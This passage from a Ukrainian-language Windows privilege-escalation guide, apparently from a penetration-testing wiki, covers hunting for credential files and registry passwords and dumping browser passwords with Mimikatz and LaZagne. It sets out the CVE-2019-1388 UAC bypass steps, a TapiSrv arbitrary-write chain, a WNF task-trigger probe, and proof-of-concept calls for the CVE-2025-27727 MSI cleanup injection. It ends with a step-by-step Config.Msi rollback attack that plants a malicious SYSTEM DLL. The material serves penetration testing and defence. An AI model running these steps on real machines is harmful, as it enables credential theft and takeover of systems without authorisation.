places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Бази даних Password Safe v3 зазвичай мають розширення `.psafe3`. Вважайте файл із відповідною назвою потенційним зашифрованим сховищем; його наявність не означає, що ви можете його прочитати, розблокувати чи використати збережені облікові дані. Перевіряючи, де зберігаються такі файли, перегляньте доступні профілі користувачів і налаштовані кореневі каталоги спільного доступу до файлів.

Файл KeePass `.kdbx`, який можна прочитати, також є лише підказкою про зашифроване сховище. Щоб його розблокувати, потрібні власне master-password і будь-які налаштовані фактори — key-file чи обліковий запис. Якщо під час авторизованої перевірки в записі виявлено пару хешів LM:NT, перш ніж розглядати [pass-the-hash](../ntlm/README.md#pass-the-hash), перевірте вказаний обліковий запис, а також чи є хеш NT актуальним і чи приймає його служба NTLM цільової системи. Сам запис у сховищі не надає прав Administrator або SYSTEM; для цього також мають бути доступні віддалений доступ до служби, права облікового запису та окремий крок виконання через службу. В інвентаризації слід зазначати шлях до сховища та можливість його читання, а не виводити базу даних чи збережені облікові дані.

Знайдіть усі запропоновані файли:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Облікові дані в кошику

Перевірте доступні записи кошика на наявність видалених резервних копій і архівів конфігурацій, а також файлів, у назвах яких прямо згадуються облікові дані. Корисна резервна копія `.7z`, `.zip` або `.rar` може бути кількамісячної давності й мати звичайну назву. Windows зберігає початковий шлях і час видалення в записі `$I`, а видалений файл — у відповідному записі `$R`; перш ніж відкривати архів, перевірте метадані й наявність прав на читання для поточного облікового запису. Видимість залежить від тому, SID користувача та дозволів на файли, тому порожній список не доводить, що відновлюваних резервних копій немає. Вважайте назву архіву приводом для перевірки, а не доказом того, що він містить дійсний секрет.

Доступний видалений файл `.pfx` також може бути зачіпкою для **підписування коду**. Якщо він містить доступний приватний ключ, цим ключем можна підписати змінений скрипт PowerShell; [PowerShell вимагає сертифікат для підписування коду з приватним ключем](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), а [правила видавця AppLocker перевіряють ідентифікатор підписувача та область дії правила](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Для виконання від імені іншого облікового запису потрібні можливість поточної ідентичності змінити саме цей скрипт, чинне правило, яке приймає отриманий підпис для скрипту й цільового облікового запису, а також заплановане завдання або інший процес із вищими привілеями, який справді запускає скрипт. Сама назва файлу `.pfx`, тема сертифіката чи можливість запису до скрипту не підтверджують наявність повного ланцюжка. Перш ніж відкривати матеріали з приватним ключем або запускати завдання, перевірте метадані, ACL, політику та заплановану команду.

Також перевірте доступні бази даних профілів клієнтів обміну повідомленнями, нотатки й отримані файли на наявність зачіпок, пов’язаних з обліковими даними. Експорт ключа відновлення BitLocker може зберігатися у форматі HTML або TXT, іноді — в іменованому архіві резервної копії. Такі матеріали можуть надати доступ до окремого зашифрованого тому даних зі старішими резервними копіями; перевіряйте том і архів лише за наявності дозволу на доступ. Якщо резервна копія містить `NTDS.dit`, для відновлення облікових даних домену в автономному режимі також потрібен відповідний кущ `SYSTEM`, як описано в [процесі роботи з резервними копіями та привілейованими групами](../active-directory-methodology/privileged-groups-and-token-privileges.md). Самі назви файлів і заблокований том не доводять наявності придатного ключа відновлення чи резервної копії домену.

Щоб **відновити паролі**, збережені в кількох програмах, можна скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### У реєстрі

**Інші можливі розділи реєстру з обліковими даними**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Витягування ключів OpenSSH з реєстру.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Перевірте бази даних, де зберігаються паролі з **Chrome, Edge або Firefox**.\
Також перевірте історію, закладки та вибране в браузерах: там можуть зберігатися **паролі**.

Для стандартного профілю Edge **Default** поточного користувача файл `Login Data` розташований у `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, а `Local State` — у батьківському каталозі `User Data`. [Microsoft описує розташування профілю за замовчуванням](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); інший профіль або політика `UserDataDir` можуть змінити його. Наявність файлу — лише підказка щодо сховища облікових даних: перевірте, чи доступні для читання відповідні файли, чи маєте контекст DPAPI відповідного користувача або інший дозволений матеріал ключа, а також чи належить збережений логін обліковому запису з вищими привілеями. Перелік лише шляхів не потребує відкриття бази даних або виведення розшифрованих паролів.

Для Firefox [Mozilla зазначає](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), що `key4.db` і `logins.json` у профілі — це відповідні файли ключа та зашифрованих логінів. Їхня наявність — лише підказка: перевірте, чи доступні для читання обидва файли, чи є збережені записи та чи захищений ключ Primary Password, перш ніж робити висновок, що облікові дані можна використати. Якщо відновлені облікові дані належать доменному обліковому запису, окремо перевірте ефективні права цього облікового запису на керування групами та [права групи на читання або розшифрування пароля LAPS](../active-directory-methodology/laps.md); самі артефакти браузера не підтверджують наявність шляху до прав адміністратора.

Інструменти для отримання паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а його функціональність надається через один або кілька інтерфейсів, ідентифікованих за допомогою ідентифікаторів інтерфейсів (IID).

Класи та інтерфейси COM визначені в реєстрі відповідно в розділах **HKEY\CLASSES\ROOT\CLSID** та **HKEY\CLASSES\ROOT\Interface**. Цей реєстр створюється шляхом об’єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

У CLSID цього реєстру можна знайти дочірній розділ **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, і значення **ThreadingModel**, яке може бути **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single або Multi) або **Neutral** (без прив’язки до потоку).

![Історія браузерів — перезаписування COM DLL: у CLSID цього реєстру можна знайти дочірній розділ InProcServer32, який містить значення за замовчуванням, що вказує на DLL, і значення...](<../../images/image (729).png>)

Отже, якщо ви можете **перезаписати будь-яку DLL**, яка має виконуватися, то зможете **підвищити привілеї**, якщо цю DLL запустить інший користувач.

Щоб дізнатися, як зловмисники використовують COM Hijacking як механізм закріплення, дивіться:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Пошук паролів у файлах і реєстрі**

**Пошук умісту файлів**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Пошук файлу з певним ім'ям**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Пошук у реєстрі назв ключів і паролів**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**. Я створив цей плагін, щоб **автоматично запускати кожен POST-модуль metasploit, який шукає облікові дані** на комп’ютері жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли з паролями, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для отримання паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сеанси**, **імена користувачів** і **паролі** для різних інструментів, які зберігають ці дані у відкритому вигляді (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Уявіть, що **процес, який працює від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) із **повним доступом**. Цей самий процес **також створює новий процес** (`CreateProcess()`) **із низькими привілеями, але той успадковує всі відкриті дескриптори головного процесу**.\
Тоді, якщо ви маєте **повний доступ до процесу з низькими привілеями**, можна отримати **відкритий дескриптор привілейованого процесу**, створений за допомогою `OpenProcess()`, і **впровадити shellcode**.\
[Прочитайте цей приклад, щоб дізнатися більше про те, **як виявити й використати цю вразливість**.](leaked-handle-exploitation.md)\
[Прочитайте [**цю іншу публікацію**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/), де докладніше пояснюється, як тестувати й використовувати інші відкриті дескриптори процесів і потоків, успадковані з різними рівнями дозволів (не лише з повним доступом).]

## Named Pipe Client Impersonation

Сегменти спільної пам’яті, які називають **каналами (pipes)**, дають змогу процесам обмінюватися даними та передавати їх.

У Windows є функція **Named Pipes**, яка дає змогу не пов’язаним між собою процесам обмінюватися даними, навіть через різні мережі. Це нагадує архітектуру клієнт/сервер, у якій ролі визначаються як **сервер іменованого каналу** та **клієнт іменованого каналу**.

Коли **клієнт** надсилає дані через канал, **сервер**, який налаштував цей канал, може **перейняти особу** **клієнта**, якщо має необхідні права **SeImpersonate**. Якщо виявити **привілейований процес**, який обмінюється даними через канал, що його можна імітувати, це дає змогу **отримати вищі привілеї**, перейнявши особу цього процесу, коли він взаємодіятиме зі створеним вами каналом. Інструкції з проведення такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наведений інструмент дає змогу **перехоплювати обмін даними через іменований канал за допомогою такого інструмента, як Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **А цей інструмент дає змогу переглядати всі канали, щоб знаходити privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Служба Telephony (TapiSrv) у режимі сервера надає доступ до `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований клієнт може зловживати асинхронним шляхом подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **запис 4 байтів** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, а потім отримати права адміністратора Telephony та завантажити довільну DLL як службу. Повний ланцюжок дій:

- Викликати `ClientAttach`, задавши для `pszDomainUser` наявний шлях, доступний для запису → служба відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для асинхронного запису подій.
- Кожна подія записує контрольований зловмисником `InitContext` із `Initialize` у цей дескриптор. Зареєструвати line app за допомогою `LRegisterRequestRecipient` (`Req_Func 61`), викликати `TRequestMakeCall` (`Req_Func 121`), отримати дані через `GetAsyncEvents` (`Req_Func 0`), а потім скасувати реєстрацію та завершити роботу, щоб повторювати детерміновані записи.
- Додати себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, знову підключитися, а потім викликати `GetUIDllName` із довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Докладніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть запускати код у Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Зловживання обробниками протоколів / ShellExecute через засоби рендерингу Markdown

Клікабельні посилання Markdown, передані до `ShellExecuteExW`, можуть активувати небезпечні URI-обробники (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) і запускати файли, контрольовані зловмисником, від імені поточного користувача. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Коли ви отримуєте shell від імені користувача, можуть виконуватися заплановані завдання або інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди записує командні рядки процесів і порівнює поточний стан із попереднім, виводячи всі відмінності.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Викрадення паролів із процесів

## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені "NT\AUTHORITY SYSTEM", використовуючи непривілейований обліковий запис.

Це дає змогу одночасно підвищити привілеї та обійти UAC за допомогою тієї самої вразливості. Крім того, нічого не потрібно встановлювати, а бінарний файл, який використовується під час цього процесу, підписаний і виданий Microsoft.

Деякі з уражених систем:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Щоб експлуатувати цю вразливість, необхідно виконати такі кроки:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

У вас є всі необхідні файли та інформація в цьому GitHub-репозиторії:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Від Administrator із середнім рівнем цілісності до високого рівня цілісності / UAC Bypass

Прочитайте це, щоб **дізнатися про рівні цілісності**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions у каталозі завантажень, що ведуть до кореневого каталогу вебсервера

Застосунок може створювати каталог для завантажень із передбачуваною назвою, записувати в нього файл із назвою, яку надає користувач, а потім обробляти цей файл. Якщо користувач із низькими привілеями може видалити цей каталог і замінити його на NTFS junction до запису з боку сервера, запис може піти через junction до каталогу, що обслуговується вебсервером. Розміщений там скрипт може виконуватися з обліковим записом служби вебсервера, якщо сервер запускає файли такого типу. Це специфічна для застосунку межа довільного запису; самі по собі доступний для запису каталог завантажень або наявний junction цього не доводять.

Перевірте точне формування шляху та час виконання в обробнику завантажень, ефективні права користувача на видалення та створення каталогу, ефективні ACL каталогу призначення, чи переходить записувач за reparse points, а також чи запускає вебсервер файли в цьому каталозі. Окремо підтвердьте ідентичність процесу записувача та вебсервера. Пасивна інвентаризація може показати ACL каталогів і метадані reparse points, але не може встановити поведінку обробника чи майбутню заміну на junction. Якщо виконання відбувається від імені облікового запису служби, перевірте **фактичний токен процесу**, перш ніж розглядати окремий шлях через привілеї токена.

## Очищення привілейованого scheduled task, запущене через WNF

Scheduled task, який забороняє ручний запуск, усе одно може мати тригер, доступний непривілейованому користувачу. Під час аудиту привілейованого завдання експортуйте його XML і перевірте **всі** тригери, а також DACL завдання, principal і action. Зокрема, `WnfStateChangeTrigger` задає стан Windows Notification Facility (WNF); якщо поточний користувач має дозвіл публікувати оновлення для цього стану, він може опосередковано запустити завдання від імені налаштованого облікового запису, незважаючи на `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Наприклад, завдання Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` запускалося від імені SYSTEM, приймало від стандартного користувача оновлення стану WNF `7508BCA32C079E41`, а потім перевіряло `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, навіть коли Recall було вимкнено.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Щоб перевірити доступність, отримайте адресу `ZwUpdateWnfStateData` з `ntdll.dll`, надішліть порожнє оновлення для восьмибайтового імені стану та зіставте код повернення з даними про останній запуск завдання або активністю Procmon. У наведеному нижче скороченому пробнику використано послідовність байтів із прикладу завдання Recall; замініть її байтами, експортованими для завдання, яке перевіряється.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Перетворення рекурсивного очищення на привілейоване видалення

Корисний примітив — це не лише тригер, а привілейована процедура очищення, яка приймає контрольований зловмисником каталог. Простежте операцію від переліку об’єктів до кінцевої зміни: виявлення профілів/сеансів, вибір дочірніх об’єктів за wildcard-шаблоном, `SHCreateItemFromParsingName` і `IFileOperation::DeleteItem` — вагомі ознаки того, що раніше перевірений шлях згодом буде рекурсивно оброблено. Якщо нащадки не відкриваються відносно довірених дескрипторів каталогів і не перевіряються перед видаленням, зловмисник може змінити спосіб розв’язання шляху між переліком і використанням.<sup>[[43]](#references)</sup>

Поєднайте тригер WNF із [підміною через oplock, junction і символічне посилання Object Manager](#from-folder-contents-delete-to-system-eop), описаною нижче: oplock призупиняє очищення після вибору легітимного дочірнього об’єкта, а доступний для запису батьківський каталог підміняється так, щоб після відновлення роботи привілейоване видалення пройшло через `\RPC Control` до захищеної цілі. У ланцюжку Recall це призвело до видалення `C:\Config.Msi` із правами SYSTEM, необхідного для задокументованої техніки відкату MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Вкладені нащадки обходять поверхневі виправлення для reparse point

Перевірка лише контрольованого зловмисником кореневого каталогу та його безпосереднього дочірнього об’єкта не захищає від рекурсивного видалення за шляхом. Залиште ці перевірені об’єкти легітимними, а підміну через junction/oplock перемістіть у додатковий дочірній об’єкт нижче за ієрархією; зрештою `IFileOperation::DeleteItem` дійде до неперевіреного нащадка та перейде за його новою ціллю. CVE-2026-20941 виникла саме через такий неповний захист: після першого виправлення Recall перевіряли `UKP` і каталог із назвою у форматі GUID, але зберегли стару операцію рекурсивного видалення.<sup>[[43]](#references)</sup>

Безпечний підхід — відкривати **кожного нащадка** відносно вже довіреного дескриптора каталогу, отримувати й перевіряти кінцевий розв’язаний шлях/об’єкт, а потім застосовувати позначку видалення до перевіреного дескриптора. Не перевіряйте префікс, щоб потім знову перейти до рекурсивного видалення за шляхом. Під час перевірки виправлень також аналізуйте структури безпосередньо в місці виклику: у цьому випадку дослідження під час виконання `OBJECT_ATTRIBUTES` у `NtCreateFile` показало ненульове поле `RootDirectory` та відносне ім’я `{GUID}\\secure_file.lock`, спростувавши оманливий результат декомпіляції, який вказував на наявність другого примітива `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Від довільного видалення/переміщення/перейменування папки до SYSTEM EoP

Техніка описана [**в цій публікації блогу**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), а код exploit [**доступний тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Атака полягає у зловживанні функцією відкату Windows Installer, щоб під час видалення замінити легітимні файли шкідливими. Для цього зловмисник має створити **шкідливий інсталятор MSI**, який використають для перехоплення каталогу `C:\Config.Msi`. Пізніше Windows Installer використовуватиме цей каталог для зберігання файлів відкату під час видалення інших пакетів MSI; ці файли відкату буде змінено так, щоб вони містили шкідливе корисне навантаження.

### Ін’єкція шляху очищення через COM у Windows Installer (CVE-2025-27727)

Клієнт із низькими привілеями може звернутися до служби `msiexec.exe` із правами SYSTEM через COM-об’єкт `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Зворотний аналіз визначив відповідні виклики `IMsiServer`: `MsiBeginTransactionW` зі зміщенням `0xA0` у vtable, `SetEEUIDirectoryAndFilter` зі зміщенням `0xC8` та `CleanupTempPackages` зі зміщенням `0x50`. Ці назви та зміщення отримано зворотним аналізом; вони можуть відрізнятися в різних збірках.<sup>[[41]](#references)</sup>

Для користувача без прав адміністратора `SetEEUIDirectoryAndFilter` імітує контекст виклику лише під час відкриття вказаного шляху з прапорцями `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` і `FILE_FLAG_OPEN_REPARSE_POINT`. Це підтверджує, що викликач може видалити каталог, і запобігає переходу за reparse point, але **не** прив’язує перевірений файловий об’єкт до подальшого очищення й не доводить, що його створив Windows Installer.<sup>[[41]](#references)</sup>

Після `MsiBeginTransactionW` метод `SetEEUIDirectoryAndFilter` додає шлях до черги як папку незалежно від аргументу фільтра, переданого викликачем. Служба записує іменоване значення `REG_DWORD` у `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ім’я значення — це контрольований викликачем шлях, а дані `0x00000002` позначають папку. Після цього `CleanupTempPackages(NULL, FALSE)` безпосередньо запускає очищення. Його підвищений у правах робочий процес перелічує значення реєстру та передає записи для папок рекурсивній функції `FDeleteFolder`, не перевіряючи походження шляхів. Якщо звичайне видалення не вдається, код також викликає `LockdownPath`, скидає атрибути файлів і повторює спробу.<sup>[[41]](#references)</sup>

Мінімальна послідовність викликів, відновлена з `msi.dll`, така:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Корисний primitive тут — повторне використання шляху, а не перенаправлення через junction. Зареєструйте створений атакувальником `C:\Config.Msi`, видаліть його й дочекайтеся, поки Windows Installer пізніше відтворить той самий шлях із захищеними даними для rollback. Під час очищення система довіряє застарілому імені `TempPackages` і видаляє нову директорію від імені SYSTEM. Це обходить передбачений захист `FILE_FLAG_OPEN_REPARSE_POINT` і mitigation довіри до перенаправлень, оскільки reparse point не потрібен.<sup>[[41]](#references)</sup>

Цей primitive видалення вписується в наведений нижче ланцюжок rollback: збережіть окремий запис `Installer\Folders`, видаліть захищений `C:\Config.Msi`, відтворіть його з NULL DACL і збережіть handle з правом `WRITE_DAC`, відкритий до того, як інсталятор посилить DACL. Через попередньо відкритий handle можна відновити дозвільний DACL за допомогою `NtSetSecurityObject`, після чого згенерований `.rbs` можна замінити до відновлення rollback.<sup>[[41]](#references)</sup>

Microsoft виправила цю вразливість, заборонивши `CMsiTransaction::SetEEUIDirectoryAndFilter` викликати `ScheduleFileOrFolderDelete`, коли ввімкнено новий feature gate. COM-виклик усе ще може повертати успіх, але шлях, контрольований атакувальником, більше не додається до `TempPackages`. Застосуйте оновлення безпеки Windows за квітень 2025 року, а не перевіряйте наявність виправлення за успішним поверненням методу.<sup>[[41]](#references)[[42]](#references)</sup>

Короткий опис техніки:

1. **Етап 1 — Підготовка до перехоплення (залиште `C:\Config.Msi` порожнім)**

- Крок 1: Інсталюйте MSI
    - Створіть `.msi`, який встановлює нешкідливий файл (наприклад, `dummy.txt`) у доступну для запису папку (`TARGETDIR`).
    - Позначте інсталятор як **"UAC Compliant"**, щоб його міг запускати **неадміністратор**.
    - Залиште відкритим **handle** до файлу після встановлення.

- Крок 2: Почніть видалення
    - Видаліть той самий `.msi`.
    - Процес видалення почне переміщувати файли до `C:\Config.Msi` і перейменовувати їх на файли `.rbf` (резервні копії для rollback).
    - **Перевіряйте відкритий handle** за допомогою `GetFinalPathNameByHandle`, щоб виявити, коли файл стане `C:\Config.Msi\<random>.rbf`.

- Крок 3: Власна синхронізація
    - `.msi` містить **власну дію видалення (`SyncOnRbfWritten`)**, яка:
        - Сигналізує, коли файл `.rbf` записано.
        - Потім **очікує** на іншу подію, перш ніж продовжити видалення.

- Крок 4: Заблокуйте видалення `.rbf`
    - Після отримання сигналу **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **завадить його видаленню**.
    - Потім **надішліть сигнал у відповідь**, щоб видалення могло завершитися.
    - Windows Installer не зможе видалити `.rbf`, і оскільки не зможе видалити весь вміст, **`C:\Config.Msi` не буде видалено**.

- Крок 5: Видаліть `.rbf` вручну
    - Ви (атакувальник) вручну видаляєте файл `.rbf`.
    - Тепер **`C:\Config.Msi` порожній**, і його можна перехопити.

> На цьому етапі **запустіть вразливість довільного видалення папки з рівнем SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 — Заміна rollback-скриптів шкідливими**

- Крок 6: Відтворіть `C:\Config.Msi` зі слабкими ACL
    - Самостійно відтворіть папку `C:\Config.Msi`.
    - Установіть **слабкі DACL** (наприклад, Everyone:F) і **залиште відкритим handle** із правом `WRITE_DAC`.

- Крок 7: Запустіть інше встановлення
    - Знову встановіть `.msi`, указавши:
        - `TARGETDIR`: доступне для запису розташування.
        - `ERROROUT`: змінну, яка спричиняє примусову помилку.
    - Це встановлення використовуватиметься, щоб знову запустити **rollback**, який читає `.rbs` і `.rbf`.

- Крок 8: Відстежуйте появу `.rbs`
    - Використовуйте `ReadDirectoryChangesW`, щоб відстежувати `C:\Config.Msi`, доки не з’явиться новий `.rbs`.
    - Збережіть його ім’я.

- Крок 9: Синхронізуйтеся перед rollback
    - `.msi` містить **власну дію встановлення (`SyncBeforeRollback`)**, яка:
        - Сигналізує про створення `.rbs`.
        - Потім **чекає**, перш ніж продовжити.

- Крок 10: Повторно встановіть слабкі ACL
    - Після отримання події `.rbs created`:
        - Windows Installer **повторно застосує суворі ACL** до `C:\Config.Msi`.
        - Але оскільки у вас усе ще є handle із правом `WRITE_DAC`, ви можете **знову застосувати слабкі ACL**.

> ACL **перевіряються лише під час відкриття handle**, тому ви все ще можете записувати до папки.

- Крок 11: Створіть підроблені `.rbs` і `.rbf`
    - Перезапишіть файл `.rbs` **підробленим rollback-скриптом**, який вказує Windows:
        - Відновити ваш файл `.rbf` (шкідливу DLL) у **привілейоване розташування** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Створіть підроблений `.rbf` зі **шкідливою DLL-навантаженням рівня SYSTEM**.

- Крок 12: Запустіть rollback
    - Надішліть сигнал події синхронізації, щоб інсталятор продовжив роботу.
    - **Власну дію типу 19 (`ErrorOut`)** налаштовано так, щоб **навмисно спричинити збій встановлення** у відомій точці.
    - Це запускає **rollback**.

- Крок 13: SYSTEM встановлює вашу DLL
